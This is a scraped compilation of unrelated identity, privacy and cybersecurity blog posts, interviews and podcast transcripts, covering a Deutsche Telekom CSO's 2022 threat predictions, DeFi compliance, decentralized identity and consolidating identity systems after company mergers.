<p>Since early 2017 I ended up falling into the crypto rabbit hole and preaching to my friends about it. However, at that point it was mostly a hobby and a bit of an obsession, but still something that at the time didn’t cross my mind could become a profession.</p>
<p>Soon after returning from the Netherlands to Barcelona, I started looking for my next professional adventure and landed at Tokeny, and it felt like the planets aligned, the rest is history.</p>

		 
	 
 
	 
		 
			 How would you describe working at Tokeny Solutions? 
<p>Working at Tokeny has been a pleasure, very welcoming since day one and surrounded by very talented and engaged people. The team has always been flexible and adaptable, even in the face of our current world situation, allowing me to grow and partake in interesting projects.</p>
 What are you most passionate about in life? 
<p>I’m a sucker for anything tech related. When I’m not checking the latest toys, I like to gather around friends and family for some relaxing long meals or gaming sessions.</p>

		 
	 
 
	 
		 
			 What is your ultimate dream? 
<p>From a personal point of view, I dream about having a comfortable and joyful life with my loved ones without any complications. On a global scale, I would love for all of us to stop fighting inwards over every detail and work together towards our general betterment, what couldn’t we achieve then?</p>
 What would you change in the world if you could? 
<p>A bit of a generic statement, but I would love to see hate disappear, or at least mostly reduced. So that people would focus more on what makes us similar than what differentiates us, all this would leave us with more time to enjoy life instead of wasting it in squabbles.</p>

Zero trust refers to the alignment of maturing identity practices, an established understanding of user behaviors, and the application of least-privilege access security policy decisions to trust boundaries. In this week's State of Identity, host, Cameron D’Ambrosi debunks the buzz around zero trust architecture with Ryan Case, Chief Cybersecurity Architect at SailPoint. They provide first-hand guidance on identity-defined security architecture and how it enriches authorization with both contextual and intelligent access information to make objective decisions. In this session, you'll learn how to reduce friction to end-users while enabling deliberate identity verification and policy decisions.</p>

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Thomas Tschersich, Chief Security Officer at Deutsche Telekom, served as an advisor in the preparation for the <a href="https://www.kuppingercole.com/sessions/4864">Cyber Council Panel on Cybersecurity Predictions 2022</a> which will see CISOs, CIOs, and CSOs discuss next year's cybersecurity threatscape on Wednesday, November 10 from 09:30 pm to 10:10 am at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Thomas some questions about his predictions.</p>
  
 Could you give us a sneak peek into the “Cybersecurity Trends 2022”? 
<p>Yeah, actually, well, when I look at the recent developments, I believe that DDoS attacks will be definitely an ongoing trend next year as well. So we see a couple of thousand attacks every month. And the second thing which will drive us will be, in my prediction, the ransomware topic, as this is still growing. We might see some new deep fakes. So cases with CEO fraud, with really deep faked videos instead of just cheating email conversations or phone calls. But that's in a nutshell what I do expect.</p>
 Which three Cybersecurity types of attacks do you expect being most threatening to your organization and why in 2022? 
<p>So I have no special type of attack in mind here. I would turn that a little around. So what I do expect most threatening not only for us but for all organizations, is still that we don't have the basics under control. What do I mean by that? Not having the basics under control is, for me, not more and less than cleaning up our infrastructures by introducing software updates really in a timely manner to the new detection of vulnerabilities. So we're all not good in doing so. And the result is that more than 95 percent of the attacks are being successful just because of missing software updates or bad configurations of systems.</p>
<p>This should keep us awake at night and this should be the priority number one, two, and three for next year, really to get it fixed. And so we need to bundle our forces so we need a better exchange between enterprises to share whether an update is working or not. So not to do testing in any case at any company so we can become better just by sharing that knowledge. But we also need better support from vendors. There are still a lot of also huge vendors existing which are not really open and honest about their vulnerabilities and which are not really supporting their clients on a daily basis.</p>
 Which three Cybersecurity topics are most important to you and why in 2022? 
<p>Look, as the whole industry is now moving more and more into cloud services, the perimeter of the company is paralyzing itself. So there is no perimeter to protect any longer, actually no perimeter like in the past. So there's not the one and only perimeter. So, therefore, I believe concepts like Zero Trust becoming increasingly important to bundle the security more to the endpoint and on the other side, to the data itself and not any longer to the corporate network infrastructure. So this is for me, one definite trend we have.</p>
<p>The second thing which is closely aligned with that is that prevention only is not sufficient enough for the future. It's more about having capabilities to monitor the status, to monitor your infrastructure, and then to be able to react fast if there are some anomalies being detected there. Yeah, this is the biggest challenge for most of the organizations, as a lot of organizations were pretty much focused on shielding themselves, building a fence around their infrastructure. And that's more or less one hundred percent of the cyber protection. And nowadays, you have to assume that attackers will be successful at one point in time, and therefore, you need to have these better monitoring capabilities without for sure losing the preventive approach totally. So but it's shifting the forces, and that's definitely one of the priorities for me and my team.</p>
 What are your three biggest challenges in implementing Cybersecurity and why? 
<p>I would say the challenge, number one, is the shortage of resources, of skilled resources, at the market and it's the challenge number two, three, four, five, six, seven, eight, and ten, and so on. That's the biggest issue currently, really to find the right people for your team to find the right resources to deal with security as the market is demanding so much at the moment. It is totally empty. So we're investing a lot in training and education for our people to train them by ourselves. So that's the only way out at the moment. And yeah, I guess this is what we need to solve. Otherwise, we got lost in the cybersecurity arena. It's not that much a technical issue because there are a lot of technical solutions available and in place. It's more the people to run those infrastructures.</p>

 A look into how we’re ensuring compliance without removing the “De” from&nbsp;DeFi. <p>Decentralized finance is the new frontier of investment and value propagation on the internet. It offers a new, innovative method for investing in assets. It removes the hassle of going through regulated channels and submitting many documents for verification of personal data. On the surface, this seems like an ideal solution for many people since it gives them a way to invest and keep their assets and earnings anonymous to those it doesn’t concern. It also introduces an added element of security for many individuals since they are in complete control of their finances.</p><p>Unfortunately, DeFi also opens up a nest of issues, including users bypassing Anti Money-laundering (AML) laws and Countering the Financing of Terrorism (CFT) guidelines. Given the decentralized nature of the sector, however, how can compliance even be implemented? Compliant DeFi, something we’re proud to be pioneering at Shyft Network, would deal with these issues and other regulatory elements such as Know Your Customer (KYC) rules without forcing users and companies to conform to a centralized data store. Recent regulatory constraints such as the FATF Travel Rule and stipulations in the Infrastructure Bill mean that DeFi needs to start taking compliance seriously.</p> Not As Counter-Intuitive As It First&nbsp;Seems <p>Compliance in the financial sector helps to bring confidence to the consumer, financial institutions, and regulators. Unfortunately, the side effect of this added consumer confidence is the financial institution’s storage of personal user data, shared at will with governments. Since there’s no decentralized methodology for collecting and storing information in decentralized finance, implementations of KYC, CFT, and AML rules must become more innovative. Luckily, Shyft has been looking into the problem, and we’ve developed several solutions that fit the needs of decentralized finance platforms the world&nbsp;over.</p><p>The biggest issue we’ve seen with compliance is that it tries to impede the very soul of decentralization. Regulators are afraid that decentralized applications (DApps) don’t have a central body responsible for their function. The FATF Travel Rule (among others) underlines the reasoning behind regulators’ insistence on establishing a compliance framework for cryptocurrencies.</p><p>In essence, the most significant concern regulators have boils down to accountability. If someone does something illegal within the realm of DeFi, who is responsible for the fallout? Is it the decentralized autonomous organization’s (DAO’s) members? Is it the DApp that facilitated the illegal action or collected the proceeds on behalf of the perpetrators? Is it the stakeholders of the blockchain where the illegal proceeds were stored? There exists a need for this sort of accountability in the cryptoverse, but the implementation cannot go against the core foundation of why decentralized finance exists. We cannot create a decentralized platform and then centralize its data for compliance purposes. The solution, therefore, is to find a way to decentralize this data collection and verification process.</p> A Way&nbsp;Forward <p>Shyft Network has spent a considerable amount of time assessing, analyzing and researching these challenges, developing a solution that works well with current compliance regulation, and marrying it to an approach that maintains the spirit of decentralization. The solutions we are developing examine the existing framework of decentralization and use those as a base for creating a network that exists in harmony with current implementations. The Shyft Network doesn’t force any users to make fundamental changes to how their underlying systems work. Instead, it’s a modular implementation that allows for secure financial transactions with minimal risk to users. Solutions we’ve developed to deal with the compliance problem in DeFi&nbsp;include:</p>  Veriscope GDPR/AML Compliant Discovery Mechanism: Veriscope is one of Shyft Network’s most recent innovations to offer Virtual Asset Service Providers (VASPs) like crypto exchanges a way to deal with the FATF Travel Rule and reach compliance. Veriscope is a decentralized solution (in holding with Shyft’s focus on keeping the decentralization in DeFi) that helps VASPs deal with the regulatory requirements instituted by authorities.  Proof of Identity and Whitelisted Addresses: The Shyft Network can work with both centralized and decentralized entities to bring about equality in verifying user information. DeFi participants can submit their data to a verifying oracle which will be used to safelist their address for transactions. Once the address has been whitelisted and linked with the user’s identification, they can participate in DeFi transactions freely. Recently, Shyft Network <a href="https://shyftnetwork.medium.com/shyft-network-partners-with-kylin-network-to-deploy-data-oracles-for-compliant-defi-infrastructure-fcc2c7c3a233">partnered with Kylin</a> to develop these decentralized oracles in keeping with their goal to provide a safe, secure way for financial institutions to interact with the DeFi&nbsp;space.  Risk Assessment Mechanisms for DeFi Projects: To ensure that bad actors don’t abuse the system or take advantage of users, wallet transactions with smart contracts will be continually monitored for signs of untoward behavior. DeFi platforms that want to know more about their users can easily access this information to ensure that they have a more trustworthy network.   Expanding Markets Mean More Compliance is Necessary <p>DeFi is a space that will see exponential growth in the coming years. Early adopters already have their hands full, trying to keep abreast of the burgeoning growth and development of decentralized applications. However, as the popularity of DeFi grows, the threat of regulation will always linger, and facing it head on is the best way to deal with it. Compliance allows decentralized platforms to stay one step ahead of regulators, giving users the peace of mind they want. Shyft Network will be continuing to lead this charge to create proactive, innovative compliance in its network.

<p>This quote from Tech Crunch commentor&nbsp;<a href="https://techcrunch.com/2021/08/10/with-liberty-and-privacy-for-some-widening-inequality-on-the-digital-frontier/">Cillian Kieran</a>&nbsp;caught our eye: “Alongside regulation, every software engineering team should have privacy tools immediately available. When civil engineers are building a bridge, they cannot make it safe for a subset of the population; it must work for all who cross it. The same must hold for our data infrastructure, lest we exacerbate disparities within and beyond the digital realm.”</p>



<p>The quote comes from an&nbsp;<a href="https://techcrunch.com/2021/08/10/with-liberty-and-privacy-for-some-widening-inequality-on-the-digital-frontier/">article</a>&nbsp;on “widening inequality on the digital frontier” which poses valuable questions about whether we now need “a material perspective on widening privacy disparities — and their implication in broader social inequality — to catalyze the privacy improvements the U.S. desperately needs.” Kieran raises the material argument since, he says, the law doesn’t always recognize the emotional perspective of privacy as harm or as a driver for regulatory change.</p>



<p>Kieran makes two great points: First, almost all users in the US (except those who live in California under the CCPA) have no rights to opt-out of aggressive data collection and targeted advertising. But the fact that Californians&nbsp;can&nbsp;opt out implies there are harms from targeted advertising, which we know to be true and have discussed&nbsp;<a href="https://mysudo.com/2021/06/the-privacy-pitfalls-of-personalized-advertising/">here</a>,&nbsp;<a href="https://anonyome.com/2021/06/do-consumers-even-want-personalized-ads/">here</a>&nbsp;and&nbsp;<a href="https://anonyome.com/2021/06/digital-advertising-may-present-national-security-risks-us-senators/">here</a>. So why aren’t we protecting the millions of users who live anywhere other than California from these harms?</p>



<p>Kieran cites the example of targeted advertising leading to discrimination in<a href="https://hbr.org/2019/11/how-targeted-ads-and-dynamic-pricing-can-perpetuate-bias">&nbsp;housing and employment opportunities</a>, “sometimes in violation of federal law” where it “impedes individuals’ autonomy, preemptively narrowing their window of purchasing options, even when they don’t want to.”&nbsp;</p>



<p>Second, Kieran points out&nbsp;money talks, including in digital privacy protection. He points to Apple making noises about privacy being a human right all while building and marketing luxury products only some can afford.&nbsp;</p>



<p>He argues: “… if those declaring privacy as a human right only make products affordable to some, what does that say about our human rights? Apple products skew toward<a href="https://www.comscore.com/Insights/Infographics/iPhone-Users-Earn-Higher-Income-Engage-More-on-Apps-than-Android-Users">&nbsp;wealthier, more educated consumers</a>&nbsp;compared to competitors’ products. This projects a troubling future of increasingly exacerbated privacy disparities between the haves and the have-nots, where a feedback loop is established: Those with fewer resources to acquire privacy protections may have fewer resources to navigate the technical and legal challenges that come with a practice as convoluted as targeted advertising.”&nbsp;</p>



<p>“We deserve meaningful privacy protections that everyone can afford. In fact, to turn the phrase on its head,&nbsp;we deserve meaningful privacy protections that no company can afford to omit from their products.&nbsp;We deserve a both/and approach: privacy that is both meaningful and widely available.”</p>



<p>Kieran says the only way to close the disparity gap and get meaningful protections is via privacy legislation and privacy tools. Lawmakers must set the standards and engineers must have no reason not to embed user data privacy controls in products they develop.&nbsp;</p>



<p>He says: “We need privacy rules set by an institution that is not itself playing the game. Regulation alone cannot save us from modern privacy perils, but it is a vital ingredient in any viable solution.”</p>



<p>Which brings us back to where we started:</p>



<p>“Alongside regulation, every software engineering team should have privacy tools immediately available. When civil engineers are building a bridge, they cannot make it safe for a subset of the population; it must work for all who cross it. The same must hold for our data infrastructure, lest we exacerbate disparities within and beyond the digital realm.”</p>

In the course of human history, trust has changed its meaning from a person’s word to a bill of exchange, to a legal document and, most recently, in the 21st century, to technology. In the last decade, blockchain has created “trustless” systems where individuals do not need to trust anyone except software to verify transactions. Blockchain brought not only trust to the masses through shared access of decentralized information but has also fundamentally changed the future of trust ecosystems.</blockquote><p>Ontology, with its MainNet launch in June 2018, is building infrastructure for a peer-to-peer trust network with a decentralized identity framework that allows users to have full control over their data for real-world use cases. While traditional economies rely on third party service providers to facilitate trust, Ontology enables decentralized trust that aims to integrate the blockchain and different business sectors through partnerships to provide distributed services including distributed communities, data verification, data exchange, and credit across industries.</p><p>Cointelegraph — <a href="https://cointelegraph.com/news/likes-out-facebook-blackout-sparks-ideas-for-web-3-0">Likes out: Facebook blackout sparks ideas for Web&nbsp;3.0</a></p><blockquote>Over the past few years, the influx of moral concerns surrounding privacy breaches, data gathering, censorship and fake news has fuelled the conversion for a renovation of the social media platforms that have come to dominate our democracy. The prevalence and severity of such issues have even begun to deter conscious users away from centralized behemoths like Facebook, YouTube and Twitter, in favor of more liberating alternatives. The rapid emergence of cryptocurrency and blockchain technology, specifically its native features of decentralization, transparency and community reward, has empowered the rise of these next-generation initiatives.</blockquote><p>Going forward, a move toward decentralized identity solutions is essential to ensure data privacy and security. By facilitating end-to-end technology run on blockchain, decentralized solutions enable private information to be shared securely, while users remain in full control of their data. In contrast to centralized solutions, decentralized systems ensure private data remains immutable and secure and is only able to be shared when users consent to provide information.</p><p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

<p>In <a href="https://medium.com/mydex/flicking-the-switch-of-personal-data-4c5d0d368a31">our last blog</a> we talked about diverse, practical ways in which we help people and organisations use personal data to get stuff done — to enrich peoples’ lives and improve service quality in a way that cuts friction, effort, risk and cost for both&nbsp;sides.</p><p>The tools and capabilities we discuss in that blog are great. But to be truly valuable, they also need to be robust and ethical. They need to be based on sound design principles.</p><p>Below are some of the design principles that underpin our infrastructure and services — principles designed to ensure that what we do truly does serve citizens, today and into the&nbsp;future.</p>  Safe, efficient data logistics Our personal data stores (PDSs) use APIs to enable safe efficient data sharing between individuals and organisations. Organisations can deposit data in an individual’s PDS, and individuals can share data with these organisations. Our PDSs don’t only provide safe storage facilities. They also provide safe, efficient data sharing capabilities which keep the individual in control. We call this ‘personal data logistics’.  Individual the point of integration Our personal data stores enable individuals to aggregate data about themselves that is currently dispersed across many different service providers. For example, most UK citizens have over a dozen relationships with different financial service providers: one or more banks and building societies, loan providers, mortgage providers, savings providers, investment services, pensions, insurances and so&nbsp;on.  <p>It’s only by aggregating data from all these service providers (and by adding additional information that only the individual knows) that it’s possible to gain a true, fully-rounded picture of an individual’s financial circumstances, and therefore to be able to give truly personalised, relevant advice. That is why we applied for and got an Open Banking&nbsp;licence.</p><p>Our infrastructure is designed to enable the provision of such genuinely personalised advice across every walk of life: money, health, career,&nbsp;etc.</p>  An asset for life By enabling individuals to aggregate data (including <a href="https://medium.com/mydex/proving-verified-attributes-work-3f9ca813d43f">verified attributes</a>) about themselves in their own personal data store, we provide them with an asset for life: an asset that grows in value over time as more data is added to&nbsp;it.  Seek win-wins Many data relationships are adversarial, where one side seeks to extract value from another. We seek to enable mutually beneficial, productive relationships between citizens and bona fide service providers. For example, as the data in an individual’s personal data store grows in richness and value, citizens can bring this data with them to relationships with service providers, helping both sides access and use the data they need for better services at lower&nbsp;cost.  Neutral In line with the above, our platform is not designed to help one organisation gain competitive advantage over another. It is designed to enable all sides to improve the way they operate, by helping everyone involved reduce friction, effort, risk and cost for example. So our charging structure doesn’t favour one organisation over another and it doesn’t incentivise us to try and make money out of individuals’ data either. (For example, if we charged a fee per data transaction, our revenues would grow with the volume of data sharing and that could incentivise us to pressurise individuals into sharing more data than they want to. So we&nbsp;don’t.)  Truly independent Our personal data stores are truly independent and under the control of the individual. They do not sit inside any data-holding service provider’s organisational boundaries and do not depend on any service provider’s systems and technologies. Individuals don’t have to use any organisation’s identity processes to access their data. Organisations which deposit copies of an individual’s data in that individual’s personal data store cannot tell the individual what they should or shouldn’t do with it, or who they can or can’t share it&nbsp;with.  <p>This is important because the more fashionable personal data stores become, the more people there are out there pretending to offer personal data stores but where, if you look a little more closely, it actually continues the organisation’s control of individuals’ data (by doing one or more of the&nbsp;above).</p>  Safety and security Each individual’s personal data store is separately and individually encrypted. This means our infrastructure is distributed, not centralised — so that it is designed to be the opposite of a honeypot for hackers. (If a hacker wants to access the records of millions of people in a centralised corporate database, they only need to succeed in one hack. For a hacker to access the records of a million people on our infrastructure, they would have to succeed at a million separate, different hacks, each time accessing the data of only one individual. That makes the hacker’s incentives a million times a million less attractive (a million times harder, for a millionth of the&nbsp;reward).  No knowledge Each individual holds their own encryption key to their PDS, which we don’t have. We have designed our systems so that they do not look at an individuals’ personal data or who is delivering it or requesting it. We have provided the tools needed for the individual to be in control and able to see who is using their data for what purpose and approve such uses. We cannot see and don’t want to see their data. As a Community Interest Company we want to help people, not exploit them or intrude upon&nbsp;them.  Interoperable There is no point in doing all the above good things if the end result is to trap people inside a system that they can’t get out of. People have to have choices; genuine alternatives. Competition over who can provide the best genuine data empowerment can only be a good thing. For this reason, we expect many personal data store providers to emerge, and we are fully committed to enabling users to transfer their data from our systems to other systems and vice versa. We believe in interoperability.  Commercial integrity Our business model is designed to support all the above principles. We are a Community Interest Company. Yes, we are commercial — to fulfil our mission we have to cover our costs. But we are not in this to maximise the profits we can make, but to maximise the benefits citizens can get from their data. So we don’t charge individuals for having a PDS. Instead, organisations pay us for enabling safe, efficient data sharing relationships with customers.   Summary <p>As the concept of personal data stores grows more fashionable, we’ve got no doubt that clever people will invent many exciting new tools that do wonderful things. That’s great. It’s how it should&nbsp;be.</p><p>But for such creativity to really deliver value, it must be built on solid foundations. We believe design principles like the ones listed above provide the foundations our society needs to put personal data on a new, trustworthy footing.</p> <p><a href="https://medium.com/mydex/designed-for-integrity-13a69bcda0b2">DESIGNED FOR INTEGRITY</a> was originally published in <a href="https://medium.com/mydex">Mydex</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

 Podcast transcript 
<p>Let’s Talk About Digital Identity, the podcast connecting identity and business. I am your host, Oscar Santolalla.</p>
<p>Oscar Santolalla: Hello and thanks for joining today. After some time we are having a guest from the house, from Ubisecure, and he is a guest who has been in Ubisecure for 12 years. So let me introduce to you, Keith Uber.</p>
<p>He is the VP Customer Success at Ubisecure. As an identity and access management product expert, he leads the Sales Engineering team and is involved in many stages in the planning and design of demanding customer implementation projects. Keith is active in various industry organisations, and has a keen interest particularly in government mandated digital identity systems. Having been involved in dozens of IAM implementation projects, he is quick to identify organisation’s needs, and provide suitable configuration, integration and roadmap guidance.</p>
<p>Hello Keith and welcome.</p>
<p>Keith Uber: Hello, Oscar. And thank you very much for having me. It’s a pleasure to be here.</p>
<p>Oscar: It is really great talking with you. You had really long experience in Ubisecure and in the industry so have super interesting things to tell us. We will talk about mergers and acquisitions today. But before that, we’d like to hear a bit more about yourself, so please tell us your journey to this world of digital identity.</p>
<p>Keith: For me, digital identity became part of my career when I moved to Finland in 2000. So this was the height of the .com boom. I got a job working for Sonera, which is now Telia, one of the largest Telco operators in the Nordic countries. As part of that role, one of my jobs was to help Telia to combine the login systems for various small start-up companies, various small projects that they had acquired during the .com phase. They acted as a kind of a technology incubator for many small companies too so they had a huge portfolio of disparate services, all with different ways to sign in and authenticate. That’s where my journey started.</p>
<p>So I have a background as a software engineer. I have a Bachelor of IT and previously worked in logistics field as a software developer. But after moving to Finland, I later studied software business then continued after graduation joined Ubisecure and I’ve been working with identity and access management, particularly customer identity and access management ever since then. So in various roles I have been involved in so many different customer projects, not only individual customers, but also entire industries or government services that are going online. So I’ve been really fortunate to have a wide range of experience in quite a short amount of time.</p>
<p>Oscar: Very interesting. Sounds to be your first contact with digital identity there in Sonera – was the previous name for what is Telia today. So you mentioned several small companies that they had these challenges of authentication, login, registration, this kind of stuff. I’m guessing, we talk about 2000 is that there were not standards like we had today about digital access management. So well, I can imagine challenging has been that time, today, still challenging, but we have standards, and that is great.</p>
<p>But also that comes to the topic of today, right? So company can acquire smaller organisations. And one of the challenges is, for instance, if a company – let’s move from Telco to, let’s say e-commerce – can be a big e-commerce place acquires a smaller one, another e-commerce place, and what the customers would, by knowing that if they read that on the news, they will expect that “OK, and now I can log in from one place to another automatically, right?” That’s what the customer would expect. I think that’s one of the challenges I guess you are going to tell us more. But in your opinion, why is identity an important topic when it comes to mergers and acquisitions?</p>
<p>Keith: I think the most important part of mergers and acquisitions is that the customer is the value of the company. They’re the consumer who is buying the services or the people interacting with the company. So in a merger or acquisition or divestiture, when a company splits into two, it’s important that you retain those customers, that you don’t by mismanagement or mistake accidentally isolate your customers, make it difficult for them to sign in, or make it difficult for them to start to enjoy the services of the company that you’re also acquiring. So that’s all about keeping that valuable asset, keeping the customer happy.</p>
<p>Oscar: Yeah, I agree because it might be that you, as a customer, one can be super happy with a service, with a company. And after that, after the merger/acquisitions, well, things don’t work so smooth anymore for the customer, right? And that can make as you said, have the customers unhappy.</p>
<p>Keith: In most cases, mergers are all about acquiring some type of complementary company or company that offers a service that is enjoyable for the current user population. So it’s all about allowing them to start to consume more and more services so you get more revenue for every customer.</p>
<p>Oscar: Exactly. So now if you put the shoes of company that knows that they are going to be merged or there is acquisition already in place and start to plan how we are going to merge the systems, et cetera. What are these, for you, are the top, the key identity considerations that this organisation has to go through?</p>
<p>Keith: You spoke about the importance of standards and how the industry has really standardised on some key identity standards. So for companies who are looking to grow through either being acquired or acquiring other companies, it’s important that they have their identity management under control. They’re using standardised systems, they’re using the same standards that other services use, that makes the migration and integration process much, much easier.</p>
<p>And part of that underlying is all about data quality. So making sure that you’re keeping your user information, your user database, not only secure but up to date that it’s full of verified and valued information that could be easily used to match accounts as you go through that merging process.</p>
<p>Another really important thing is to really plan carefully about how that merger will look from the end user perspective, what will they retain, which account will they retain, will become their core account, or will you allow the customers to sign in using both types of credentials that they already have? And then what’s the timeline, for example sunsetting the unused or the system that will be turned off.</p>
<p>Generally, in terms of mergers and acquisitions, you want to simplify the IT systems by merging them and then sunsetting or turning off the system that you don’t choose to continue with. And that’s all about reducing the overall costs for not only licensing of the system, but also uptake and management of the system and simplifying the IT architecture to reduce, for example, simple things like customer support, when somebody has trouble logging in, or resetting a password, or enabling a new authentication method that is common across the whole organisation.</p>
<p>There’s a slight risk there that by combining multiple systems, even two or three into one, you’re also putting your eggs into one basket so there’s of course a risk of having a single point of failure. But on the flip side, you have more people, more IT resources looking at one system, focusing on one system and having expertise in that one system and keeping that up-to-date and smoothly running. And all modern identity and access management systems are fully reliable at scale in that type of scenario.</p>
<p>Oscar: And I guess also, one point is we’ve been talking mostly about customers, but about the workforce, about the employees I think they are also important considerations.</p>
<p>Keith: Oh, absolutely. The backend staff, who need to access these systems, and as the internal employees also merge, you want to make that as smooth as possible so that the company that’s being required, they also feel like fully-fledged employees, as soon as we can.</p>
<p>During this mergers and acquisitions process, often the process is followed very, very closely, especially for publicly listed companies, and you want to try to achieve merging both IT systems as quick as you can, so that you can show that the corporate acquisition has been a success on both the technical level and on a sales level. So in terms of planning for an IT organisation, it’s important to start that planning very early in the process and getting ready and planted well, so you can do that quickly and efficiently, and move to that new common platform as quickly as you can.</p>
<p>Oscar: Yeah, I think you mentioned the fact that the system has to be consolidated, you know that that’s the biggest part of these projects of identity and access management, in cases of mergers and acquisitions. So to start seeing, what are the drawbacks and the benefits of consolidating these systems?</p>
<p>Keith: The benefits I would hope would be improved information security, probably moving away from an older legacy style identity access management system to a newer one. You bring with that new functionality, which might simplify the IT architecture. So for example, rather than having custom registration processes or custom tools for user management, you might move to out of the box solutions where those facilities are provided as a standard part of the package. In many cases, you might combine the move with a move from on-premises to cloud. Most companies are moving towards the cloud, if they have that on their corporate strategy for IT then they can make that change either at the same time or prepare to do that shortly afterwards.</p>
<p>The risks, as you say, is a very simple thing can be if, for example, consumer facing services, a lot of users are already logged in to devices, or they’re already logged in with their browser and different password managers, different browsers and applications remember the user in different ways. And if you start to upset the flow of how those passwords are remembered and presented to applications, you can very easily sort of lock your users out. For a wider consumer population, the sheer frustration of having to remember their password or go through a password reset process can be a big difference, it’s a difference between giving up and downloading the next app of your competitor, so it requires a bit of careful planning to make that flow as smooth as you can.</p>
<p>Typically in that system, you’d allow the users who are migrating off the old system to sign in ones using the old system. Ideally, you would be able to migrate any existing password hashes from the old system to the new system, or have a very smooth onboarding flow to allow them to either set a new secure password or log in using a strong authentication method, either government or banking ID used by users in that region, or some other existing strong authentication method that the user already has.</p>
<p>Oscar: That remembers me some cases of being involved in which the passwords have been hashed, has to be of course, but long time ago, and when there were less agreed standards about that, and that can be tricky if the system that is- the new system that is importing this hash passwords is not compatible with the old system. So that can create, of course, can create problems, so that’s why standards is- fulfilling the current standards, and of course, also having some backward compatibility. It’s super important into this.</p>
<p>Keith: There are really simple benefits, for example, in many older legacy systems, the username is based around either a randomly generated number or letter combination, or it’s provided by the user themselves. And for many end users, it’s a challenge to even remember what their username is.</p>
<p>In the extreme situations, we see corporate systems, for example, B2B systems where the customer needs to put in not only the customer number, but they also put in a user ID as well as a password. To migrate to a system where you maybe simplify that more like consumer facing services where you could either centralise around using your email address as your identifier, which is much, much easier to remember. Or allow the user to link their account to an existing account, such as a social media account, or LinkedIn, or other Microsoft account, for example, to allow the users to sort of move away from having a proprietary username format, and move on to having, for example, a corporate email address or their personal email address as their account identifier.</p>
<p>Oscar: Yes, and now moving to how to make this consolidation in a good way, how to have success in this CIAM consolidation, what are the – what’s a good approach? Could you tell us the main points about that?</p>
<p>Keith: Yeah, I touched earlier the importance of data quality. So to make sure that the data is clean before you start to do any type of migration, it’s really important to understand what data in each system is and how it’s validated and make sure that those formats are valid in the new system. There’s a very clear decision point of to which system you’re going to migrate, which system will be the ongoing system in the future. So typically, that would be one of the two existing systems, to the more modern of the two, to the one which is with the more capabilities and more features, longer lifecycle.</p>
<p>But it may be that you choose a third system, a new system to replace both and migrate those systems to the new. And that provider, for example, jump forward, for example, to support newer scenarios, such as not only different types of strong authentication techniques, or identity protocols, but also things like identity delegation, or electronic power of attorney, these types of services, which existing legacy systems might not support out of the box.</p>
<p>From the end user perspective, so whether they’re B2B users or consumer users, it’s really important to have very clear communications that, OK, the company has been acquired, the name is possibly changing, the brand is changing. Please be aware of this from the very beginning. And then very clear communication about when things change in the IT system. So allow the users to be aware that when they log in their login screen might change, might look different. They might have to set a new password or re-verify their email address, for example. It’s really important to have that communication in as clear user focused language as possible.</p>
<p>Oscar: Yes.</p>
<p>Keith: A lot of IT teams make the mistake of using the language that they understand and not the language that their user understands.</p>
<p>Oscar: Yeah, I have seen actually some examples like that. I don’t remember the names, but sometimes come one email saying “OK, we are having this transition to a new brand.” And it looks so simple that “OK, yeah, nice.” And other times it’s completely techie jargon, then “Oh, my God, what are you talking about?”</p>
<p>Keith: That’s right, yeah. Then you have to decide whether to move everything in one go. So have a certain date where you migrate everything in one go, do a big bang approach. Or you’re migrating applications, sort of one by one or user groups one by one. Some of that can be done, for example, as the user logs in, you can migrate users on a user-by-user basis. Or it kind of depends how much the applications are shared across the different companies; how many users use applications from both of the companies involved in the merger.</p>
<p>Oscar: So those are the main points for consolidation of identity and access management systems.</p>
<p>Keith: From a technical perspective, it’s important to try to identify if there’s a common attribute between those two systems. So if you have a trusted attribute from each of the user repositories, for example, an email address that has been verified or a phone number that has been verified, even identity number, social security number or national identity number. These can be used as common attributes to allow automated migration of users so that they can log in automatically. In cases where, for example, password hashes can be migrated, or where the user is signing in using a government or national ID platform.</p>
<p>Oscar: Yes. And in terms of compliance, normally, what are the compliance points that are relevant in this type of projects?</p>
<p>Keith: Yeah, so particularly, it’s around collecting consent where required from the user about other data is going to be, maybe data controller will be processed or will be changed during that process. So using again your IAM tools to collect that as the user signs in again, explaining that and communicating any changes to the terms and conditions. In cases where the system is in different geographical areas or different legal jurisdictions, there may be requirements, for example, for storage of user data within certain countries’ boundaries. So you may have to replicate data or have data stored within a region, you have to think carefully about those situations, especially in global or cross regional mergers and acquisitions.</p>
<p>Oscar: Yeah, yeah, certainly. And we’ve already touched in several aspects beyond the technical, the technical side, of course. We talk about standards, we talk about security, but we also talk about compliance for instance. And we talk about branding and how to communicate these things. Many people are definitely involved in all these projects that are connected to the migration of identity and access management. But this is way beyond what identity people work on that. So if you can close telling us what is your ending piece of advice, advice for companies that are today planning on mergers and acquisition?</p>
<p>Keith: I’d say definitely take advantage of the opportunities that moving to a new identity and access management system can provide for customers. So for example, if you haven’t been able to take advantage of things like linking accounts to existing user accounts, allowing users to have federation – meaning that when they’re signed into your system, they can also sign into complementary services, giving the users new tools around managing their own account, having a really good user dashboard and a way to agree or modify their permissions for the system.</p>
<p>I think beyond just the roar savings in turning off one system, or reducing the support costs for having to deal with multiple different systems, there’s real advantages in moving to one common system that has the new corporate brand, is smooth and secure for the end user, and gives them also new functionality.</p>
<p>They see that, “OK, it’s the advantage is I get to sign in. But oh, I also get this new thing. I also get a more secure account or easy way to sign in.” I think that’s something to use as an advantage in that. Also, a real big move and a real good opportunity is to think about at that stage moving to the cloud, if you’ve been hesitating about moving your identity and access management system to a cloud-based service, it can be a good time to do that during a merger and acquisition.</p>
<p>Oscar: Indeed. And as one of these last things you are talking about and – is one of the first things you talk about today is a customer, taking the opportunity to bring a better experience to the customers.</p>
<p>Keith: The way you sign in is often the front door for the service, the first place that the user ends up in when they click on a link from marketing or when they’re trying to login to their own account and you want to make that as a smooth process as possible.</p>
<p>Oscar: Yeah, exactly. Well, thanks a lot, Keith, for telling us this about mergers and acquisitions. And for the people who would like to follow, continue this conversation with you, what are the best ways to follow up or get in touch with you?</p>
